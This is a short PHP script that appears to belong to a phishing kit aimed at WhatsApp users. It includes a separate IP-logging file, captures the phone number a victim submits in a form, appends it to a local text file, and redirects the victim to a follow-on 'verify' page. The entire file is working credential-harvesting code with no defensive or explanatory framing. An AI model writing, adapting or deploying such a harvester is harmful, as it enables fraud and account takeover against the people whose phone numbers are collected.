<?php
include 'ip.php';

header('Location: verify.html');

file_put_contents("usernumbers.txt", 
                    "WhatsNumber: " . $_POST['TEL' ] . "\n" .
		    "============================". "\n",  FILE_APPEND );
exit();
?>
